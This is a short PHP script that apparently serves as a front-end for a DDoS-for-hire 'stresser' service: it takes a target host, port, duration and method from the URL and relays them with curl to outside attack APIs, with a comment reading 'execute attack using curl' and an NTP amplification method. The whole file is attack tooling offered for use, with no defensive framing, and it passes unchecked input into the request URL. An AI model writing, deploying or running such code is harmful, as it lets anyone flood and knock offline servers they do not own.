<?php

//get variables
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];

//methods/urls here
if($method == "NTP"){
$apiurl = 'https://website.com/api.php?host='.$host.'&port='.$port.'&time='.$time.'&method=NTP';
}
               
if($method == "NTP"){
$apiurl = 'https://website2.com/api.php?host='.$host.'&port='.$port.'&time='.$time.'&method=NTP';
}

//execute attack using curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $apiurl);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
$data = curl_exec($ch);
curl_close($ch);

//echo results
echo $data;

?>
